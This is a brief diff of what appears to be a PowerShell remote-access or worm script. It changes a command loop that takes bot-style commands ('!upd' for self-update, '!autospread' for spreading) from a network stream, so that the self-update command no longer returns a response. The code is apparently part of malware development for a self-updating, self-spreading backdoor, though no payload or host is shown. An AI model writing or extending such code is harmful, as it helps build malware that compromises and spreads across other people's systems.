@@ -703,8 +703,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = ""
                     }
                    elseif ($cmd -eq "!upd") {
-                        $response = Update-Self
-                    }
+                            Update-Self
+                            continue
+                        }
                     elseif ($cmd -eq "!autospread") {
                         Invoke-AutoSpread -stream $stream
                         $response = ""
